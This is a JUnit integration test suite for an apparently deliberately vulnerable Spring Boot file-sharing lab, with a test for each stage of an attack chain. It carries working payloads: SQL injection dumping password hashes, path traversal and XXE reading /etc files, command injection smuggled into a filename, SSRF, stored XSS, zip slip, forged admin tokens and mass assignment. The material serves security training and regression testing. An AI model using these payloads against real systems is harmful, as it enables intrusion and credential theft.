package org.example.secshare.vuln;

import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.web.client.TestRestTemplate;
import org.springframework.boot.test.web.server.LocalServerPort;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.test.context.ActiveProfiles;

import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assumptions.assumeThat;
import static org.example.secshare.vuln.ExploitHelpers.*;

/**
 * Vuln profili (tum bayraklar acik) altinda saldiri zincirinin her adiminin
 * gercekten somurulebildigini kanitlar. Ayni testler SecureModeIT'te tersine
 * cevrilir (bayraklar kapaliyken bloklanmali).
 */
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
@ActiveProfiles("vuln")
class VulnChainIT {

    @Autowired
    TestRestTemplate rest;

    @LocalServerPort
    int port;

    private String base() {
        return "http://localhost:" + port;
    }

    private static boolean notWindows() {
        return !System.getProperty("os.name", "").toLowerCase().contains("win");
    }

    @Test
    void stage1_userEnumeration() {
        assertThat(login(rest, base(), "nobody@corp.local", "x").getStatusCode())
                .isEqualTo(HttpStatus.NOT_FOUND);
        assertThat(login(rest, base(), "alice@corp.local", "wrong").getStatusCode())
                .isEqualTo(HttpStatus.UNAUTHORIZED);
    }

    @Test
    void stage1_bruteForceLoginWorks() {
        assertThat(loginToken(rest, base(), "alice@corp.local", "Summer2024!")).isNotBlank();
    }

    @Test
    void stage2_forgedAdminTokenAccessesAllFiles() {
        ResponseEntity<String> r = get(rest, base() + "/api/files/all", forgeAdminToken());
        assertThat(r.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(r.getBody()).contains("salary.pdf");
    }

    @Test
    void stage2_massAssignmentGrantsAdmin() {
        String email = "attacker-" + System.nanoTime() + "@evil.com";
        assertThat(register(rest, base(), email, "password1", "ADMIN").getStatusCode().is2xxSuccessful()).isTrue();
        String token = loginToken(rest, base(), email, "password1");
        // ADMIN rolu ile /all erisilebilmeli
        assertThat(get(rest, base() + "/api/files/all", token).getStatusCode()).isEqualTo(HttpStatus.OK);
    }

    @Test
    void stage3_idorReadsOthersFile() {
        String all = get(rest, base() + "/api/files/all", forgeAdminToken()).getBody();
        String aliceFile = fileIdByName(all, "salary.pdf");
        assertThat(aliceFile).isNotNull();

        String bob = loginToken(rest, base(), "bob@corp.local", "password123");
        // guvenli uc: bob baskasinin dosyasina erisemez
        assertThat(get(rest, base() + "/api/files/" + aliceFile, bob).getStatusCode())
                .isEqualTo(HttpStatus.FORBIDDEN);
        // vuln uc: legacy sahiplik kontrolu yok -> flag sizar
        assertThat(get(rest, base() + "/api/files/legacy/" + aliceFile, bob).getBody())
                .contains("FLAG{idor_reads_others_files}");
    }

    @Test
    void stage4_sqlInjectionDumpsHashes() {
        String bob = loginToken(rest, base(), "bob@corp.local", "password123");
        String payload = "zzz%' UNION SELECT email || ':' || password_hash FROM users -- ";
        String url = base() + "/api/files/search?name={n}";
        ResponseEntity<String> r = rest.exchange(
                url, org.springframework.http.HttpMethod.GET,
                new org.springframework.http.HttpEntity<>(bearer(bob)), String.class, payload);
        assertThat(r.getBody()).contains("$2a$"); // bcrypt hash sizdi
    }

    @Test
    void stage5_pathTraversalReadsEtcPasswd() {
        assumeThat(notWindows()).isTrue();
        String bob = loginToken(rest, base(), "bob@corp.local", "password123");
        ResponseEntity<String> r = get(rest, base() + "/api/files/raw?path=/etc/passwd", bob);
        assertThat(r.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(r.getBody()).contains("root:");
    }

    @Test
    void stage6_ssrfFetchesInternalEndpoint() {
        String bob = loginToken(rest, base(), "bob@corp.local", "password123");
        String json = "{\"url\":\"http://127.0.0.1:" + port + "/actuator/health\"}";
        ResponseEntity<String> r = postJson(rest, base() + "/api/files/import", bob, json);
        assertThat(r.getBody()).contains("UP");
    }

    @Test
    void stage6_xxeReadsLocalFile() {
        assumeThat(notWindows()).isTrue();
        String bob = loginToken(rest, base(), "bob@corp.local", "password123");
        String xml = "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><r>&xxe;</r>";
        ResponseEntity<String> r = postBody(rest, base() + "/api/files/import/xml", bob, MediaType.APPLICATION_XML, xml);
        assertThat(r.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(r.getBody()).isNotBlank();
    }

    @Test
    void stage6_yamlUnsafeLoadInstantiatesArbitraryType() {
        String bob = loginToken(rest, base(), "bob@corp.local", "password123");
        ResponseEntity<String> r = postBody(rest, base() + "/api/files/import/yaml", bob,
                MediaType.TEXT_PLAIN, "!!java.util.Date []");
        assertThat(r.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(r.getBody()).contains("java.util.Date");
    }

    @Test
    void stage7_storedXssServedInlineAsHtml() {
        String bob = loginToken(rest, base(), "bob@corp.local", "password123");
        byte[] payload = "<script>alert(document.domain)</script>".getBytes();
        String up = uploadFile(rest, base() + "/api/files/upload", bob, "x.txt", MediaType.TEXT_HTML, payload).getBody();
        String id = up.replaceAll(".*\"id\":\"([^\"]+)\".*", "$1");

        ResponseEntity<String> r = get(rest, base() + "/api/files/view/" + id, null);
        assertThat(r.getHeaders().getContentType().toString()).contains("text/html");
        assertThat(r.getHeaders().getFirst("Content-Disposition")).contains("inline");
    }

    @Test
    void stage8_commandInjectionExecutes() {
        assumeThat(notWindows()).isTrue();
        String bob = loginToken(rest, base(), "bob@corp.local", "password123");
        ResponseEntity<String> r = postJson(rest, base() + "/api/files/archive", bob,
                "{\"filename\":\"x; echo RCE_MARKER_9182\"}");
        assertThat(r.getBody()).contains("RCE_MARKER_9182");
    }

    @Test
    void stage8_zipSlipEscapesStorageDir() {
        String bob = loginToken(rest, base(), "bob@corp.local", "password123");
        byte[] zip = makeZip(Map.of("../zipslip_pwned.txt", "pwned"));
        ResponseEntity<String> r = uploadFile(rest, base() + "/api/files/extract", bob,
                "evil.zip", MediaType.APPLICATION_OCTET_STREAM, zip);
        assertThat(r.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(r.getBody()).contains(".."); // depo disina cikan yol
    }

    @Test
    void recon_actuatorEnvLeaksSecret() {
        // actuator env (show-values=ALWAYS) uygulama sirlarini sizdirir
        ResponseEntity<String> r = rest.getForEntity(base() + "/actuator/env", String.class);
        assertThat(r.getStatusCode()).isEqualTo(HttpStatus.OK);
        assertThat(r.getBody()).contains("app.jwt.secret");
    }
}
